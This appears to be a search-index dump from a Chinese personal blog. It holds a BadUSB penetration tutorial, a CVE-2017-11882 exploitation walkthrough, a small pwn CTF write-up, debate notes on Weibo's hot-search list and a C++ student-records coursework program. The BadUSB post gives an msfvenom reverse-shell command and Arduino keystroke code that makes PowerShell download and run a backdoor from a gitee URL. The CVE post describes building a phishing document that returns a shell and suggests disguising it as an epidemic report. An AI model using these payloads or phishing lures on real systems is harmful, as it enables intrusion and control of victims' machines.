Keyboard.release('r');//松掉r键 delay(500); Keyboard.println(&quot;CMD&quot;);//输入shell命令 delay(500); Keyboard.press(KEY_RETURN); //按下回车键 Keyboard.release(KEY_RETURN); //释放回车键 delay(500); Keyboard.press(KEY_CAPS_LOCK); //按下大写键 Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键 delay(500); Keyboard.end();//结束键盘通讯 } void loop() { } 编译上传，成功后看到badusb自动运行程序，打开了cmd，badusb制作成功 渗透 后门程序制作 打开kali，用MSF制作后门脚本 输入：msfvenom -p windows/meterpreter/reverse_tcp LHOST=182.168.248.131 LPORT=6666 -f exe &gt; shell.exe LHOST为kali的IP，LPORT为端口 制作好后，将它上传服务器，但是由于我懒得，所以我选择将其上传至码云仓库，效果一样，后门做好后，开始给badusb编写相应的程序 编写代码 #include&lt;Keyboard.h&gt; //包含键盘模块头文件 void setup(){ //初始化 Keyboard.begin();//开始键盘通信 delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题 Keyboard.release(KEY_CAPS_LOCK); //释放大写键 delay(500); Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 delay(500); Keyboard.press('r');//按下r键 delay(500); Keyboard.release(KEY_LEFT_GUI);//松掉win键 Keyboard.release('r');//松掉r键 delay(500); Keyboard.println(&quot;POWERSHELL -cOMMAND $CLNT = NEW-OBJECT sYSTEM.nET.wEBcLIENT;$URL = 'HTTPS://GITEE.COM/DDJSQ2333/SHELL/RAW/MASTER/SHELL1.EXE';$FILE = 'd:\\\\SHELL2.EXE';$CLNT.dOWNLOADfILE($URL,$FILE);d:\\\\SHELL2.EXE;&quot;);//输入shell命令 delay(500); Keyboard.press(KEY_RETURN); //按下回车键 Keyboard.release(KEY_RETURN); //释放回车键 delay(500); Keyboard.press(KEY_CAPS_LOCK); //按下大写键 Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键 delay(500); Keyboard.end();//结束键盘通讯 } void loop(){ } 其实就是改了输入的shell命令，用cmd下载东西，主要通过下列代码下载 $clnt = new-object System.Net.WebClient; $url = 'https://gitee.com/ddjsq2333/shell/raw/master/shell1.exe'; $file = 'D:\\\\shell2.exe'; $clnt.DownloadFile($url,$file); D:\\\\shell2.exe 开启渗透 在目标机插入该badsub，发现kali接收到弹到的shell了，文件管理器中也出现的后门程序 渗透成功，get shell了 总结 badusb虽然无法被防火墙识别到，但是它从码云仓库下载下来的后门软件会被防火墙检测到，所以要成功，要么先关闭防火墙，要么想办法绕过或者关闭防火墙，后面的操作还在研究 ","link":"https://tickertapetimer.github.io/post/基于badusb实现的基础渗透/"},{"title":" 辩论队一面辩题资料","content":"《微博“热搜榜”与互联网信息服务的规制》 据《2018微博用户发展报告》显示，新浪微博月活跃用户达到4.62亿，日活跃用户达到2亿，被公认是国内最有影响力的社交媒体平台之一。微博还是新闻媒体实现媒介融合的重要平台。据人民网研究院对全国主要媒体融合传播情况的考察，2018年报纸、广播和电视台的微博入驻率已分别达到93.3%、67.8%和97.1%。 “微博热搜”是新浪微博上线以后推出的一项应用功能，它显示的是新浪微博在特定时间段内被大量搜索和关注的热点事件或热点词汇。微博“热搜榜”会实时显示50条热搜内容，并按照热度，即搜索量进行排名；每分钟更新一次。由于新浪微博庞大的用户群体，以及几乎囊括了最重要的新闻媒体，因此其显示的用户最新关注的热点信息具有相当的代表性。 在微博上搜索相关信息，本来只是用户获取信息的行为。但“微博热搜”利用信息技术将用户的搜索内容进行统计排列，形成了“热搜榜”，用户获取信息的行为被信息化，搜索行为就具有了信息生产的属性。用户行为在无意识中成为“热搜榜”的信息来源，产生了“热搜榜”这样的网络信息新样态。在传统媒介环境下，议程设置都由媒体完成；而“热搜榜”通过对用户搜索行为的大数据运算，即时告知用户目前哪些信息是用户搜索最多也就是最为关注的议题，从而在用户集体无意识的状态下向用户提供了他们自己产生的议程设置，具有公众议程（public agenda）的属性。 在传统媒介环境中，人们通常从两个方面判断、了解和感知哪些事件是社会热点，一是媒体大量报道，二是人际传播中高频出现，即被社会热议，但后者通常只能借助一定手段感知。到了人们都“以屏为媒”了解世界的背景下，人们很少再通过人际互动寻求和获取更多相关信息，而是选择在信息平台进行搜索。于是，微博热搜给公众打开了另一个信息渠道，它以信息被用户主动搜索的频率作为考察该事件是否为社会热点的标准，通过对海量用户搜索行为的统计，即时生成热点排行榜。尽管用户搜索什么也在很大程度上受到其最近接收到什么信息的影响，但在去中心化的信息传播背景下，相比媒体报道情况（通常是其所认为的公众欲知、应知的事），这种反向的对公众主动、实时的信息搜索活动的考察，往往更能反映公众最真实的关注点。而热搜榜可以吸引更多用户从榜上直接进入所链接的页面，又会对上榜的信息形成了某种“马太效应”。于是，“上热搜”成为公众尤其是青年一代判断某个事件、现象、人物的被关注度的重要依据。据调查，微博热搜已成为大学生获取新闻信息的重要渠道。我们也时而见到有的文章把上了热搜榜作为所引资料重要性的依据。而且，它也可以成为有关业务机构观察舆情的一个窗口。可见，微博热搜是在媒介议程之外为公众议程设置提供了一个平台，成为媒介议程的重要补充。 《高校调查 热搜成为大学生获取新闻资讯主渠道》 这是杭州电子科技大学(简称“杭电”)青少年大数据研究中心下辖JAVA5.0调查团队，对全国各地各类高校542名大学生问卷调查得出结论：三成学生经常关注微博热搜；三成以上学生对微博热搜持肯定态度，认为“能快速传播社会新闻”。让调查小组印象深刻的还有，“大学生对微博热搜的娱乐性有充分认识，他们更加理性，对所谓热搜事件，大多选择“不轻信”。 热搜的不良影响（ 《热搜”的本质及议程定式理论》 微博热搜的好处（ 《浅析发展传播学视域下微博热搜的社会功能》 《浅析微博热搜对公众舆论的影响——以乐清女孩乘滴滴顺风车遇害案为例》 ","link":"https://tickertapetimer.github.io/post/辩论队一面辩题资料/"},{"title":"CVE-2017-11882漏洞分析及利用","content":"漏洞简介 CVE-2017-11882是微软公布的一个远程执行漏洞，通杀office2016版本及之前的所有版本。该漏洞的成因是EQNEDT32.EXE进程在读入包含MathType的ole数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞。上次出现这么典型的office栈溢出漏洞是著名的CVE-2012-0158。 漏洞描述 该漏洞位于office的模块EQNEDT32.EXE，该模块为office的公式编辑器，该模块存在使用有栈溢出风险的函数，导致攻击者可以通过刻意构造的数据内容覆盖掉栈上的函数地址，从而劫持程序流程，执行任意命令。 该模块路径：C:\\Program Files (x86)\\Microsoft Office\\root\\vfs\\ProgramFilesCommonX86\\Microsoft Shared\\EQUATION PS：我的路径与网上的相关模块路径有所不同，怀疑可能是微软更新了模块的路径 漏洞分析 使用工具 WIN10虚拟机、office2016、windbg、IDA、ProcessMonitor 过程 从网上下载一个该漏洞的POC，然后点开测试该漏洞是否可行。 可行，然后打开ProcessMonitor检查计算器进程的父进程，发现是EQNEDT32.EXE模块，有意思的是，EQNEDT32.EXE模块不是office的子进程，而是以单一进程存在，这可能也是office的进程保护机制，无法阻止EQNEDT32.EXE这个进程被利用的原因 因为EQNEDT32.EXE模块创建了计算器进程，而创建进程通常由两个方式，即WinExec或者CreateProcess，于是我们可以从这两个方面入手调试，我们先将windbg附加在进程中，打开注册表 在该路径下创建项EQNEDT32.EXE，创建字符串debugger，数值为windbg的.exe文件的路径（注意路径后要加文件名），这样我们就可以在启动进程时自动启动调试器。 调试器搞定了，我们可以进行调试，首先在WinExec和CreateProcess下断点 发现是断在了WinExec函数，看看栈的情况 用IDA查看430C18的汇编代码，发现他是WinExec函数的返回地址 根据栈的基本知识，我们可以得知，430C18的地址不应该出现在这里，可能是被某函数将返回地址覆盖成了该地址，从而导致WinExec函数被调用，创建了新进程，而4218E4地址，应该就是覆盖返回地址的被溢出函数，返回到上一层看看情况 看到存在函数sub_4115A7，反编译一下看看代码 看到一个非常可疑的函数sub_41160F，点进去看看 破案了，是因为使用了存在缓冲区溢出漏洞的strcpy函数，从网上找来了一张解释反汇编代码的图 现在算是成功找到溢出的点了，strcpy导致的缓冲区溢出，将栈上的返回地址覆盖为WinExec函数的地址，导致创建进程 漏洞利用 这个漏洞是可以造成栈溢出，那么能不能制作一个钓鱼文档，当目标机打开时，攻击机可以拿到反弹回来的shell呢？ 答案是肯定的，在https://github.com/starnightcyber/CVE-2017-11882上面就有现成可以使用的脚本，下载下来，放进kali的MSF的路径下，我的路径是/usr/share/metasploit-framework/modules/exploits/windows/exp1/exp1是新建的文件夹，用于存放PS_shell.rb脚本，这样就可以启动MSF直接使用了。 开启MSF 使用该脚本 输入相关数据 其中lhost是kali的IP，可以看到运行exploit后，产生了一个网址http://192.168.248.131:8080/abc这是我们制作doc文件所要链接的地址，然后开始制作doc文件 py脚本也来自于上面的GitHub链接，制作好文件后，把它放到目标机打开（注意不能只查看，必须启用编辑模式） 回到kali看，发现成功了 打开shell 已经成功入侵目标机 漏洞总结 该漏洞主要通过钓鱼式攻击，如果将漏洞文件伪装成疫情报告、出国出省信息收集表这些紧跟时事的热点，感觉是比较容易让人下载点开的，但是现在一般电脑都有防火墙杀毒软件，office也有相应的补丁，而但凡有一个补丁或者杀毒软件，这种文件就会被检测到，所以只要不裸机，这个漏洞基本不是什么大问题。所以说，不要裸机，最起码防火墙要开，并且，不要随便下乱七八糟的东西，钓鱼式攻击的命门是只要不点开，就完全拿你没辙。 ","link":"https://tickertapetimer.github.io/post/CVE-2017-11882漏洞复现及分析/"},{"title":"pwn IOF","content":"首先看源码 可以看到，v1给的范围有0x340的空间，而if语句要求v1要&lt;=99，再看后面，发现有一句v4[v1]=v3，而想要拿到flag，v2就必须&lt;=0，我们再看看栈的情况。 在栈上，v4、v3、v2、v1按顺序依次排列为var_330、var_338、var_33c、var_340，因为v2已有初始值，所以我要想办法用一个负数覆盖v2，而仅有的可以输入的数里面，v1是v4数组的下标，应该无法用来覆盖，所以，唯一可以用来覆盖的值，就只有v3了。而v3想要覆盖到v2，v4的数组下标必须要指到v2的位置，于是v1输入-2，-2也小于99，if语句也可以通过，于是可以得到解题的payload，即：依次输入-2、任意负数、任意数。 ","link":"https://tickertapetimer.github.io/post/pwn-IOF/"},{"title":"C++课设","content":"1、课程设计题目及内容： 设计一个程序，对学生的学籍信息进行管理。通过该系统实现对学生基本信息的录入、保存、删除、修改、查询等操作。 设计要求及提示如下： 1、学生基本信息包括：学号、姓名、性别、年龄、班号、专业名称、系别等。 2、使用类和对象的概念实现程序设计。 3、以菜单形式显示各功能项。 4、各功能项如下： （1）学生基本信息的录入。 （2）学生基本信息的删除。 （3）学生基本信息的修改。 （4）学生基本信息的查询。 （a)按学号查询单个学生信息； (b)按姓名查询单个学生信息； (c)按性别查询学生信息； (d)按班号查询学生信息； （5）学生基本信息的统计。 (a)按性别统计学生人数； (b)按班号统计学生人数； (c)按年龄统计学生人数； (d)按系别统计学生人数； （6）退出系统。 5、执行某个功能之后，程序将重新显示菜单供用户选择。 6、将学生学籍信息保存到文件中。 功能模块的设计及算法描述： 在程序主菜单中包含“查询”、“修改”、“添加”、“删除”、“统计”选项， 分别通过类函数“find”、“modify”、“add”、“deleted”、“stat”来实现， 在进入主菜单界面前，会通过类函数“load”来读取文件， 在退出菜单时，会通过类函数“save”来保存文件。 在类student中，定义了学生的学号“school”、名字“name”、性别“sex”、年龄“age”、班级号“classnum”、专业“profess”、系别“college”七个属性，通过重载“=”、“&lt;&lt;”、“&gt;&gt;”三个符号，来进行数据的转换在使用添加模块时，要求依次输入这些属性，并且通过创建一个student类型的数组去存储这些数值。 程序中使用的数据及主要符号说明： 使用了学生的学号“school”、名字“name”、性别“sex”、年龄“age”、班级号“classnum”、专业“profess”、系别“college”七个数据 代码 #include&lt;iostream&gt; #include&lt;fstream&gt; #include&lt;iomanip&gt; using namespace std; class student { private: int num;//编号 string school;//学号 string name;//姓名 string sex;//性别 string age;//年龄 string classnum;//班级 string profess;//专业 string college;//系别 public: student();//构造函数 void add();//增加 int find();//查找 void modify();//修改 void deleted();//删除 void save();//保存 void load();//读取 void stat();//统计 student&amp; operator = (student&amp; T); friend istream&amp; operator &gt;&gt; (istream&amp; scin, student&amp; s1); friend ostream&amp; operator &lt;&lt; (ostream&amp; scout, student&amp; s2); }; student stu[200];//创建数组用来存储临时数据 int n = 0;//全局变量，用来计算有多少人 void student::add() { int x; cin &gt;&gt; stu[n];//输入 n = n + 1;//存储人数+1 cin &gt;&gt; x; system(&quot;cls&quot;);//清屏 } int student::find() { string name1, sex1, age1, classnum1, profess1, college1, school1; int i, option, x; cout &lt;&lt; &quot;---------请选择用来查找的信息--------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 1：学号 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 2：姓名 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 3：性别 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 4：班级 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;-------------------------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;请输入选项(1-4)：&quot;; cin &gt;&gt; option;//输入查找依据 int B = 0;//判断是否找到的依据 switch (option) { case 1: cout &lt;&lt; &quot;请输入要查找的学号&quot;; cin &gt;&gt; school1; for (i = 0; i &lt; n; i++) { if (stu[i].school == school1) { cout &lt;&lt; &quot;学号&quot; &lt;&lt; stu[i].school &lt;&lt; &quot;姓名&quot; &lt;&lt; stu[i].name &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;性别&quot; &lt;&lt; stu[i].sex &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;年龄&quot; &lt;&lt; stu[i].age &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;班级&quot; &lt;&lt; stu[i].classnum &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;专业&quot; &lt;&lt; stu[i].profess &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;系别&quot; &lt;&lt; stu[i].college &lt;&lt; endl; B = 1; } } break; case 2: cout &lt;&lt; &quot;请输入要查找的姓名&quot;; cin &gt;&gt; name1; for (i = 0; i &lt; n; i++) { if (stu[i].name == name1) { cout &lt;&lt; &quot;学号&quot; &lt;&lt; stu[i].school &lt;&lt; &quot;姓名&quot; &lt;&lt; stu[i].name &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;性别&quot; &lt;&lt; stu[i].sex &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;年龄&quot; &lt;&lt; stu[i].age &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;班级&quot; &lt;&lt; stu[i].classnum &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;专业&quot; &lt;&lt; stu[i].profess &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;系别&quot; &lt;&lt; stu[i].college &lt;&lt; endl; B = 1; } } break; case 3: cout &lt;&lt; &quot;请输入要查找的性别&quot;; cin &gt;&gt; sex1; for (i = 0; i &lt; n; i++) { if (stu[i].sex == sex1) { cout &lt;&lt; &quot;学号&quot; &lt;&lt; stu[i].school &lt;&lt; &quot;姓名&quot; &lt;&lt; stu[i].name &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;性别&quot; &lt;&lt; stu[i].sex &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;年龄&quot; &lt;&lt; stu[i].age &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;班级&quot; &lt;&lt; stu[i].classnum &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;专业&quot; &lt;&lt; stu[i].profess &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;系别&quot; &lt;&lt; stu[i].college &lt;&lt; endl; B = 1; } } break; case 4: cout &lt;&lt; &quot;请输入要查找的班别&quot;; cin &gt;&gt; classnum1; for (i = 0; i &lt; n; i++) { if (stu[i].classnum == classnum1) { cout &lt;&lt; &quot;学号&quot; &lt;&lt; stu[i].school &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;姓名&quot; &lt;&lt; stu[i].name &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;性别&quot; &lt;&lt; stu[i].sex &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;年龄&quot; &lt;&lt; stu[i].age &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;班级&quot; &lt;&lt; stu[i].classnum &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;专业&quot; &lt;&lt; stu[i].profess &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;系别&quot; &lt;&lt; stu[i].college &lt;&lt; endl; B = 1; } } break; } if (B == 0) { cout &lt;&lt; &quot;找不到,按任意键后回车返回&quot; &lt;&lt; endl; cin &gt;&gt; x; system(&quot;cls&quot;); return -1; } else { cout &lt;&lt; &quot;查找结束，按任意键结束&quot;; cin &gt;&gt; x; system(&quot;cls&quot;); return i; } } void student::modify() { string name1, sex1, age1, classnum1, profess1, college1, school1; int i, option, x, option1, j; cout &lt;&lt; &quot;---------请选择用来查找的信息--------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 1：学号 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 2：姓名 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 3：性别 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 4：班级 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;-------------------------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;请输入选项(1-4)：&quot;; cin &gt;&gt; option;//输入查找依据 int B = 0;//判断是否找到的依据 switch (option) { case 1: cout &lt;&lt; &quot;请输入要查找的学号&quot;; cin &gt;&gt; school1; for (i = 0; i &lt; n; i++) { if (stu[i].school == school1) { cout &lt;&lt; &quot;学号&quot; &lt;&lt; stu[i].school &lt;&lt; &quot;姓名&quot; &lt;&lt; stu[i].name &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;性别&quot; &lt;&lt; stu[i].sex &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;年龄&quot; &lt;&lt; stu[i].age &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;班级&quot; &lt;&lt; stu[i].classnum &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;专业&quot; &lt;&lt; stu[i].profess &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;系别&quot; &lt;&lt; stu[i].college &lt;&lt; endl; B = 1; j = i; } } break; case 2: cout &lt;&lt; &quot;请输入要查找的姓名&quot;; cin &gt;&gt; name1; for (i = 0; i &lt; n; i++) { if (stu[i].name == name1) { cout &lt;&lt; &quot;学号&quot; &lt;&lt; stu[i].school &lt;&lt; &quot;姓名&quot; &lt;&lt; stu[i].name &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;性别&quot; &lt;&lt; stu[i].sex &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;年龄&quot; &lt;&lt; stu[i].age &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;班级&quot; &lt;&lt; stu[i].classnum &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;专业&quot; &lt;&lt; stu[i].profess &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;系别&quot; &lt;&lt; stu[i].college &lt;&lt; endl; B = 1; j = i; } } break; case 3: cout &lt;&lt; &quot;请输入要查找的性别&quot;; cin &gt;&gt; sex1; for (i = 0; i &lt; n; i++) { if (stu[i].sex == sex1) { cout &lt;&lt; &quot;学号&quot; &lt;&lt; stu[i].school &lt;&lt; &quot;姓名&quot; &lt;&lt; stu[i].name &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;性别&quot; &lt;&lt; stu[i].sex &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;年龄&quot; &lt;&lt; stu[i].age &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;班级&quot; &lt;&lt; stu[i].classnum &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;专业&quot; &lt;&lt; stu[i].profess &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;系别&quot; &lt;&lt; stu[i].college &lt;&lt; endl; B = 1; j = i; } } break; case 4: cout &lt;&lt; &quot;请输入要查找的班别&quot;; cin &gt;&gt; classnum1; for (i = 0; i &lt; n; i++) { if (stu[i].classnum == classnum1) { cout &lt;&lt; &quot;学号&quot; &lt;&lt; stu[i].school &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;姓名&quot; &lt;&lt; stu[i].name &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;性别&quot; &lt;&lt; stu[i].sex &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;年龄&quot; &lt;&lt; stu[i].age &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;班级&quot; &lt;&lt; stu[i].classnum &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;专业&quot; &lt;&lt; stu[i].profess &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;系别&quot; &lt;&lt; stu[i].college &lt;&lt; endl; B = 1; j = i; } } break; } string name2, sex2, age2, classnum2, profess2, college2, school2; if (B == 1) { cout &lt;&lt; &quot;已找到，请选择要更改的信息&quot; &lt;&lt; endl; cout &lt;&lt; &quot;-------------------------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 1：学号 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 2：姓名 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 3：性别 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 4：年龄 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 5：班级 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 6：专业 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 7：系别 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;-------------------------------------&quot; &lt;&lt; endl; cin &gt;&gt; option1; switch (option1) { case 1: cout &lt;&lt; &quot;新的学号&quot; &lt;&lt; endl; cin &gt;&gt; school2; stu[j].school = school2; break; case 2: cout &lt;&lt; &quot;新的姓名&quot; &lt;&lt; endl; cin &gt;&gt; name2; stu[j].name = name2; break; case 3: cout &lt;&lt; &quot;新的性别&quot; &lt;&lt; endl; cin &gt;&gt; sex2; stu[j].sex = sex2; break; case 4: cout &lt;&lt; &quot;新的年龄&quot; &lt;&lt; endl; cin &gt;&gt; age2; stu[j].age = age2; break; case 5: cout &lt;&lt; &quot;新的班级&quot; &lt;&lt; endl; cin &gt;&gt; classnum2; stu[j].classnum = classnum2; break; case 6: cout &lt;&lt; &quot;新的专业&quot; &lt;&lt; endl; cin &gt;&gt; profess2; stu[j].profess = profess2; break; case 7: cout &lt;&lt; &quot;新的系别&quot; &lt;&lt; endl; cin &gt;&gt; college2; stu[j].college = college2; break; } cout &lt;&lt; &quot;学号&quot; &lt;&lt; stu[j].school &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;姓名&quot; &lt;&lt; stu[j].name &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;性别&quot; &lt;&lt; stu[j].sex &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;年龄&quot; &lt;&lt; stu[j].age &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;班级&quot; &lt;&lt; stu[j].classnum &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;专业&quot; &lt;&lt; stu[j].profess &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;系别&quot; &lt;&lt; stu[j].college &lt;&lt; &quot;\\t&quot; &lt;&lt; endl; cout &lt;&lt; &quot;更改成功，按任意键结束&quot; &lt;&lt; endl; cin &gt;&gt; x; system(&quot;cls&quot;); } else { cout &lt;&lt; &quot;找不到该人信息，按任意键返回&quot; &lt;&lt; endl; cin &gt;&gt; x; system(&quot;cls&quot;); } } void student::deleted() { string name1; bool f5 = 0; int choose; do { cout &lt;&lt; '\\n'; cout &lt;&lt; &quot;请输入您要删除的学生姓名：&quot;; cin &gt;&gt; name1; for (int i = 0; i &lt; n; i++) { if (name1 == stu[i].name) { f5 = 1; n--; do { stu[i] = stu[i + 1]; i++; } while (i &lt;= n); } } if (f5 == 0) cout &lt;&lt; &quot;您要删除的学生不存在&quot;; cout &lt;&lt; &quot;是否要继续删除（输入1或者0）&quot; &lt;&lt; endl; cin &gt;&gt; choose; if (choose != 1 &amp;&amp; choose != 0) { cout &lt;&lt; &quot;输入错误！您只能输入Y或N&quot; &lt;&lt; endl; cin &gt;&gt; choose; } } while (choose == 1); int x; cout &lt;&lt; &quot;按任意键返回&quot; &lt;&lt; endl; cin &gt;&gt; x; system(&quot;cls&quot;); } void student::save() { ofstream fout; fout.open(&quot;system.txt&quot;); for (int i = 0; i &lt; n; i++) { fout &lt;&lt; ' ' &lt;&lt; stu[i].school &lt;&lt; ' ' &lt;&lt; stu[i].name &lt;&lt; ' ' &lt;&lt; stu[i].sex &lt;&lt; ' ' &lt;&lt; stu[i].age &lt;&lt; ' ' &lt;&lt; stu[i].classnum &lt;&lt; ' ' &lt;&lt; stu[i].profess &lt;&lt; ' ' &lt;&lt; stu[i].college &lt;&lt; endl; } cout &lt;&lt; &quot;保存成功&quot; &lt;&lt; endl; fout.close(); int x; cin &gt;&gt; x; system(&quot;cls&quot;); } void student::stat() { int option2; cout &lt;&lt; &quot;---------请选择用来统计的信息--------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 1：性别 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 2：班级 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 3：年龄 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 4：系别 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;-------------------------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;请输入选项(1-4)：&quot;; cin &gt;&gt; option2; int i; int A = 0; int x; string sex1, age1, classnum1, college1; switch (option2) { case 1: cout &lt;&lt; &quot;请输入要查找的性别&quot;; cin &gt;&gt; sex1; for (i = 0; i &lt; n; i++) { if (stu[i].sex == sex1) { A = A + 1; } } break; case 2: cout &lt;&lt; &quot;请输入要查找的班级&quot;; cin &gt;&gt; classnum1; for (i = 0; i &lt; n; i++) { if (stu[i].classnum == classnum1) { A = A + 1; } } break; case 3: cout &lt;&lt; &quot;请输入要查找的年龄&quot;; cin &gt;&gt; age1; for (i = 0; i &lt; n; i++) { if (stu[i].age == age1) { A = A + 1; } } break; case 4: cout &lt;&lt; &quot;请输入要查找的系别&quot;; cin &gt;&gt; college1; for (i = 0; i &lt; n; i++) { if (stu[i].college == college1) { A = A + 1; } } break; } cout &lt;&lt; &quot;符合该条件的人数有&quot; &lt;&lt; A &lt;&lt; &quot;人&quot; &lt;&lt; endl; cout &lt;&lt; &quot;查找结束，按任意键结束&quot;; cin &gt;&gt; x; system(&quot;cls&quot;); } void student::load() { int x; ifstream fin; fin.open(&quot;system.txt&quot;); while (!fin.eof()) { fin &gt;&gt; stu[n].school &gt;&gt; stu[n].name &gt;&gt; stu[n].sex &gt;&gt; stu[n].age &gt;&gt; stu[n].classnum &gt;&gt; stu[n].profess &gt;&gt; stu[n].college; n = n + 1; } cout &lt;&lt; &quot;文件已读取成功！按任意键后回车返回&quot; &lt;&lt; endl; fin.close(); cin &gt;&gt; x; system(&quot;cls&quot;); } student&amp; student::operator=(student&amp; T) { school = T.school; name = T.name; sex = T.sex; age = T.age; classnum = T.classnum; profess = T.profess; college = T.college; return (*this); } ostream&amp; operator&lt;&lt;(ostream&amp; scout, student&amp; s2) { cout &lt;&lt; setw(5) &lt;&lt; s2.school &lt;&lt; setw(8) &lt;&lt; s2.name &lt;&lt; setw(6) &lt;&lt; s2.sex &lt;&lt; setw(6) &lt;&lt; s2.age &lt;&lt; setw(6) &lt;&lt; s2.classnum &lt;&lt; setw(6) &lt;&lt; s2.profess &lt;&lt; setw(6) &lt;&lt; s2.college &lt;&lt; '\\n'; return scout; } istream&amp; operator&gt;&gt;(istream&amp; scin, student&amp; s1) { cout &lt;&lt; '\\n'; cout &lt;&lt; &quot;学号：&quot;; scin &gt;&gt; s1.school; cout &lt;&lt; &quot;姓名：&quot;; scin &gt;&gt; s1.name; cout &lt;&lt; &quot;性别：&quot;; scin &gt;&gt; s1.sex; cout &lt;&lt; &quot;年龄：&quot;; scin &gt;&gt; s1.age; cout &lt;&lt; &quot;班级：&quot;; scin &gt;&gt; s1.classnum; cout &lt;&lt; &quot;专业：&quot;; scin &gt;&gt; s1.profess; cout &lt;&lt; &quot;系别：&quot;; scin &gt;&gt; s1.college; return scin; } student::student()//构造函数 { name = &quot; &quot;; sex = &quot; &quot;; age = &quot; &quot;; classnum = &quot; &quot;; profess = &quot; &quot;; college = &quot; &quot;; } int choose1() { int option; cout &lt;&lt; &quot;-----------学生学籍管理系统----------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 1：查询 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 2：修改 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 3：添加 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 4：删除 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 5：统计 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;| 6：退出 |&quot; &lt;&lt; endl; cout &lt;&lt; &quot;-------------------------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;请输入选项(1-6)：&quot;; cin &gt;&gt; option; system(&quot;cls&quot;); return option; } void main() { int choose = 0; student s; s.load(); while (choose != 6)//当输入不为6时，无限循环，直至输入6退出 { choose = choose1(); switch (choose) { case 1:s.find(); break; case 2:s.modify(); break; case 3:s.add(); break; case 4:s.deleted(); break; case 5:s.stat(); break; } } s.save(); } 程序运行时的效果图 读文件 主菜单 查询 